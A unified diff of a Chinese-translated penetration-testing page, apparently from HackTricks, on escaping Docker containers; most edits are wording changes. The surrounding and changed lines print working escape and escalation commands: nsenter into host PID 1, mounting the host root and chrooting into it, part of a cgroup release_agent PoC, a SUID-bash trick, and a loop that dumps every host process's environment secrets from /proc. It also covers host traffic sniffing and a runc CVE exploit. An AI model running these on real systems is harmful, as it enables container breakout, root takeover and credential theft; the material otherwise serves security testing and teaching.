@@ -5,7 +5,7 @@
 ## 自动枚举与逃逸
 
 - [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): 它也可以 **枚举容器**
-- [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): 这个工具对于枚举你所在的容器非常 **有用，甚至尝试自动逃逸**
+- [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): 这个工具对于枚举你所在的容器非常 **有用，甚至可以尝试自动逃逸**
 - [**amicontained**](https://github.com/genuinetools/amicontained): 有用的工具，用于获取容器的权限，以便找到逃逸的方法
 - [**deepce**](https://github.com/stealthcopter/deepce): 用于枚举和逃逸容器的工具
 - [**grype**](https://github.com/anchore/grype): 获取镜像中安装的软件所包含的 CVE
@@ -33,13 +33,13 @@ nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 # Get full privs in container without --privileged
 docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
 ```
-> [!NOTE]
-> 如果 **docker socket 在意外的位置**，您仍然可以使用带有参数 **`-H unix:///path/to/docker.sock`** 的 **`docker`** 命令与其通信。
+> [!TIP]
+> 如果**docker socket在意外的位置**，您仍然可以使用带有参数**`-H unix:///path/to/docker.sock`**的**`docker`**命令与其通信。
 
-Docker 守护进程也可能 [在端口上监听 (默认 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md)，或者在基于 Systemd 的系统上，可以通过 Systemd socket `fd://` 与 Docker 守护进程进行通信。
+Docker守护进程也可能在一个端口上[监听（默认2375, 2376）](../../../../network-services-pentesting/2375-pentesting-docker.md)，或者在基于Systemd的系统上，可以通过Systemd socket `fd://`与Docker守护进程进行通信。
 
-> [!NOTE]
-> 此外，请注意其他高级运行时的运行时套接字：
+> [!TIP]
+> 此外，请注意其他高级运行时的运行时socket：
 >
 > - dockershim: `unix:///var/run/dockershim.sock`
 > - containerd: `unix:///run/containerd/containerd.sock`
@@ -52,7 +52,7 @@ Docker 守护进程也可能 [在端口上监听 (默认 2375, 2376)](../../../.
 
 您应该检查容器的能力，如果它具有以下任何一种，您可能能够逃离它：**`CAP_SYS_ADMIN`**、**`CAP_SYS_PTRACE`**、**`CAP_SYS_MODULE`**、**`DAC_READ_SEARCH`**、**`DAC_OVERRIDE`、`CAP_SYS_RAWIO`、`CAP_SYSLOG`、`CAP_NET_RAW`、`CAP_NET_ADMIN`**
 
-您可以使用 **之前提到的自动工具** 或：
+您可以使用**之前提到的自动工具**或：
 ```bash
 capsh --print
 ```
@@ -76,7 +76,7 @@ capsh --print
 - `--cgroupns=host`
 - `Mount /dev`
 
-`--privileged` 标志显著降低容器安全性，提供**无限制的设备访问**并绕过**多个保护**。有关详细信息，请参阅 `--privileged` 的完整影响文档。
+`--privileged` 标志显著降低了容器安全性，提供**无限制的设备访问**并绕过**多个保护措施**。有关详细信息，请参阅 `--privileged` 的完整影响文档。
 
 {{#ref}}
 ../docker-privileged.md
@@ -84,15 +84,15 @@ capsh --print
 
 ### 特权 + hostPID
 
-拥有这些权限后，您可以**像 init（pid:1）一样移动到主机上以 root 身份运行的进程的命名空间**，只需运行：`nsenter --target 1 --mount --uts --ipc --net --pid -- bash`
+拥有这些权限后，您可以**像 init（pid:1）一样，直接移动到主机上以 root 身份运行的进程的命名空间**，只需运行：`nsenter --target 1 --mount --uts --ipc --net --pid -- bash`
 
 在容器中执行测试：
 ```bash
 docker run --rm -it --pid=host --privileged ubuntu bash
 ```
-### 特权
+### Privileged
 
-仅凭特权标志，您可以尝试 **访问主机的磁盘** 或尝试 **通过释放代理或其他逃逸进行逃逸**。
+仅凭特权标志，您可以尝试**访问主机的磁盘**或尝试**通过滥用 release_agent 或其他逃逸进行逃逸**。
 
 在容器中执行以下绕过测试：
 ```bash
@@ -100,7 +100,7 @@ docker run --rm -it --privileged ubuntu bash
 ```
 #### 挂载磁盘 - Poc1
 
-配置良好的 docker 容器不会允许像 **fdisk -l** 这样的命令。然而，在错误配置的 docker 命令中，如果指定了标志 `--privileged` 或 `--device=/dev/sda1`，则可以获得查看主机驱动器的权限。
+配置良好的 docker 容器不会允许像 **fdisk -l** 这样的命令。然而，在错误配置的 docker 命令中，如果指定了标志 `--privileged` 或 `--device=/dev/sda1`（带大写），则可以获得查看主机驱动器的权限。
 
 ![](https://bestestredteam.com/content/images/2019/08/image-16.png)
 
@@ -168,7 +168,7 @@ sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1
 # Reads the output
 cat /o
 ```
-#### 特权逃逸滥用创建的 release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
+#### 特权逃逸 利用创建的 release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
 ```bash:Second PoC
 # On the host
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
@@ -329,14 +329,16 @@ sensitive-mounts.md
 
 ### 任意挂载
 
-在多种情况下，您会发现**容器从主机挂载了一些卷**。如果这个卷没有正确配置，您可能能够**访问/修改敏感数据**：读取秘密，修改ssh authorized_keys…
+在多个场合，您会发现**容器从主机挂载了一些卷**。如果这个卷没有正确配置，您可能能够**访问/修改敏感数据**：读取秘密，修改ssh authorized_keys…
 ```bash
 docker run --rm -it -v /:/host ubuntu bash
 ```
-### 使用两个 shell 和主机挂载进行权限提升
+另一个有趣的例子可以在 [**这个博客**](https://projectdiscovery.io/blog/versa-concerto-authentication-bypass-rce) 中找到，其中指出主机的 `/usr/bin/` 和 `/bin/` 文件夹被挂载在容器内，允许容器的 root 用户修改这些文件夹中的二进制文件。因此，如果 cron 作业使用了那里的任何二进制文件，例如 `/etc/cron.d/popularity-contest`，这允许通过修改 cron 作业使用的二进制文件来逃离容器。
 
-如果您以 **root 身份访问一个容器**，该容器挂载了主机上的某个文件夹，并且您已经 **以非特权用户身份逃逸到主机**，并且对挂载的文件夹具有读取权限。\
-您可以在 **容器** 内的 **挂载文件夹** 中创建一个 **bash suid 文件**，并 **从主机执行它** 以进行权限提升。
+### 使用 2 个 shell 和主机挂载进行特权提升
+
+如果您作为 **root 访问容器**，并且该容器挂载了主机的某个文件夹，并且您已经 **作为非特权用户逃离到主机** 并对挂载的文件夹具有读取权限。\
+您可以在 **容器** 内的 **挂载文件夹** 中创建一个 **bash suid 文件**，并 **从主机执行它** 以进行特权提升。
 ```bash
 cp /bin/bash . #From non priv inside mounted folder
 # You need to copy it from the host as the bash binaries might be diferent in the host and in the container
@@ -346,8 +348,12 @@ bash -p #From non priv inside mounted folder
 ```
 ### Privilege Escalation with 2 shells
 
-如果您在**容器内以root身份访问**并且已经**以非特权用户身份逃逸到主机**，您可以利用两个shell来**在主机内进行特权升级**，前提是您在容器内具有MKNOD能力（默认情况下是这样的），如[**在这篇文章中所述**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)。\
-拥有这样的能力，容器内的root用户被允许**创建块设备文件**。设备文件是用于**访问底层硬件和内核模块**的特殊文件。例如
+如果您在 **容器内以 root 身份访问**，并且您已经 **以非特权用户身份逃逸到主机**，您可以利用这两个 shell 来 **在主机内进行特权升级**，前提是您在容器内具有 MKNOD 能力（默认情况下是这样的），正如 [**在这篇文章中解释的**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)。\
+拥有这样的能力，容器内的 root 用户被允许 **创建块设备文件**。设备文件是用于 **访问底层硬件和内核模块** 的特殊文件。例如，/dev/sda 块设备文件提供了 **读取系统磁盘上的原始数据** 的访问权限。
+
+Docker 通过强制执行 cgroup 策略来防止容器内块设备的滥用，该策略 **阻止块设备的读/写操作**。然而，如果在容器内 **创建了块设备**，则可以通过 **/proc/PID/root/** 目录从容器外部访问它。此访问要求 **进程所有者在容器内外相同**。
+
+**利用** 示例来自这篇 [**写作**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
 ```bash
 # On the container as root
 cd /
@@ -391,7 +397,7 @@ docker run --rm -it --pid=host ubuntu bash
 ```
 例如，您将能够使用类似 `ps auxn` 的命令列出进程，并在命令中搜索敏感细节。
 
-然后，您可以 **访问 /proc/ 中主机的每个进程，您可以通过运行来窃取它们的环境秘密：**
+然后，您可以**访问 /proc/ 中主机的每个进程，您可以通过运行来窃取它们的环境秘密**：
 ```bash
 for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
 /proc/988058/environ
@@ -419,7 +425,7 @@ cat /proc/635813/fd/4
 ```
 docker run --rm -it --network=host ubuntu bash
 ```
-如果一个容器使用 Docker [主机网络驱动程序 (`--network=host`)](https://docs.docker.com/network/host/) 配置，那么该容器的网络栈就不会与 Docker 主机隔离（容器共享主机的网络命名空间），并且容器不会分配自己的 IP 地址。换句话说，**容器将所有服务直接绑定到主机的 IP**。此外，容器可以**拦截主机在共享接口上发送和接收的所有网络流量** `tcpdump -i eth0`。
+如果一个容器配置了 Docker [host networking driver (`--network=host`)](https://docs.docker.com/network/host/)，那么该容器的网络栈就不会与 Docker 主机隔离（容器共享主机的网络命名空间），并且容器不会分配自己的 IP 地址。换句话说，**容器将所有服务直接绑定到主机的 IP**。此外，容器可以**拦截主机在共享接口上发送和接收的所有网络流量** `tcpdump -i eth0`。
 
 例如，您可以使用此方法**嗅探甚至伪造主机与元数据实例之间的流量**。
 
@@ -428,7 +434,7 @@ docker run --rm -it --network=host ubuntu bash
 - [Writeup: How to contact Google SRE: Dropping a shell in cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
 - [Metadata service MITM allows root privilege escalation (EKS / GKE)](https://blog.champtar.fr/Metadata_MITM_root_EKS_GKE/)
 
-您还将能够访问**绑定到 localhost 的网络服务**，甚至访问**节点的元数据权限**（这可能与容器可以访问的权限不同）。
+您还将能够访问**绑定到 localhost 的网络服务**，或者甚至访问**节点的元数据权限**（这可能与容器可以访问的权限不同）。
 
 ### hostIPC
 ```bash
@@ -437,11 +443,11 @@ docker run --rm -it --ipc=host ubuntu bash
 使用 `hostIPC=true`，您可以访问主机的进程间通信（IPC）资源，例如 `/dev/shm` 中的 **共享内存**。这允许读取/写入其他主机或 pod 进程使用的相同 IPC 资源。使用 `ipcs` 进一步检查这些 IPC 机制。
 
 - **检查 /dev/shm** - 查找此共享内存位置中的任何文件： `ls -la /dev/shm`
-- **检查现有 IPC 设施** – 您可以检查是否正在使用任何 IPC 设施，使用 `/usr/bin/ipcs`。检查命令为： `ipcs -a`
+- **检查现有的 IPC 设施** – 您可以检查是否正在使用任何 IPC 设施，使用 `/usr/bin/ipcs`。检查命令为： `ipcs -a`
 
 ### 恢复能力
 
-如果系统调用 **`unshare`** 没有被禁止，您可以恢复所有能力：
+如果系统调用 **`unshare`** 没有被禁止，您可以通过运行来恢复所有能力：
 ```bash
 unshare -UrmCpf bash
 # Check them with
@@ -449,13 +455,13 @@ cat /proc/self/status | grep CapEff
 ```
 ### 用户命名空间滥用通过符号链接
 
-帖子中解释的第二种技术 [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) 指出如何滥用绑定挂载与用户命名空间，以影响主机内部的文件（在特定情况下，删除文件）。
+帖子中解释的第二种技术 [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) 指出如何利用用户命名空间滥用绑定挂载，以影响主机内部的文件（在特定情况下，删除文件）。
 
 ## CVEs
 
 ### Runc 漏洞 (CVE-2019-5736)
 
-如果您可以以 root 身份执行 `docker exec`（可能使用 sudo），您可以尝试通过滥用 CVE-2019-5736 来提升权限（漏洞 [在这里](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)）。该技术基本上会 **覆盖** **主机** 的 _**/bin/sh**_ 二进制文件 **从容器中**，因此任何执行 docker exec 的人都可能触发有效载荷。
+如果您可以以 root 身份执行 `docker exec`（可能使用 sudo），您可以尝试通过利用 CVE-2019-5736 来提升权限（漏洞 [在这里](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)）。该技术基本上将 **主机** 的 _**/bin/sh**_ 二进制文件 **从容器中** **覆盖**，因此任何执行 docker exec 的人都可能触发有效载荷。
 
 相应地更改有效载荷，并使用 `go build main.go` 构建 main.go。生成的二进制文件应放置在 docker 容器中以供执行。\
 执行时，一旦显示 `[+] Overwritten /bin/sh successfully`，您需要从主机机器执行以下命令：
@@ -464,18 +470,18 @@ cat /proc/self/status | grep CapEff
 
 这将触发 main.go 文件中存在的有效载荷。
 
-更多信息请参见：[https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)
+更多信息： [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)
 
-> [!NOTE]
-> 容器可能还会受到其他 CVE 的影响，您可以在 [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list) 找到列表。
+> [!TIP]
+> 容器可能还会受到其他 CVE 的影响，您可以在 [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list) 找到列表
 
 ## Docker 自定义逃逸
 
 ### Docker 逃逸表面
 
-- **命名空间**：进程应该通过命名空间与其他进程 **完全隔离**，因此我们无法通过命名空间与其他进程交互（默认情况下无法通过 IPC、unix 套接字、网络服务、D-Bus、其他进程的 `/proc` 进行通信）。
+- **命名空间：** 进程应该通过命名空间与其他进程 **完全隔离**，因此我们无法通过命名空间与其他进程交互（默认情况下无法通过 IPC、unix 套接字、网络服务、D-Bus、其他进程的 `/proc` 进行通信）。
 - **根用户**：默认情况下，运行进程的用户是根用户（但其权限是有限的）。
-- **能力**：Docker 保留以下能力：`cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
+- **能力**：Docker 保留以下能力： `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
 - **系统调用**：这些是 **根用户无法调用** 的系统调用（因为缺乏能力 + Seccomp）。其他系统调用可以用来尝试逃逸。
 
 {{#tabs}}
